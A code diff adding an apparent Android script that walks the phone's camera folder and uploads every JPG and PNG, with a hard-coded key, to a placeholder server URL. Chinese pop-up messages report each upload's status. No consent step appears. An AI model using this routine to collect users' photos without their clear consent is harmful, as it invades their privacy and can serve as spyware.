@@ -1,0 +1,43 @@
+s url="http://域名/api/upload"
+s key="7c63b59c638aa4a9e98144d9d929c18e"
+s a="/storage/emulated/0/DCIM/Camera/"
+t()
+{
+  fl(a,false,b)
+  for(c;b)
+  {
+    f(c?".jpg"||c?".png")
+    {
+      time(4,time)
+      ss(a+c,e)
+      ss("file="+e+"&key="+sss.key,post)
+      huf(sss.url,post,e,"utf-8",fh)
+      json(fh,j)
+      json(j,"get","code",code)
+      f(code==200 || code=="200")
+      {
+        ufnsui()
+        {
+          tw("上传成功")
+        }
+      }
+      else
+      {
+        ufnsui()
+        {
+        }
+      }
+    }
+    else
+    {
+      ufnsui()
+      {
+        tw("无可上传的图片")
+      }
+    }
+  }
+  ufnsui()
+  {
+    tw("该文件夹目录所有jpg和png已上传完毕")
+  }
+}
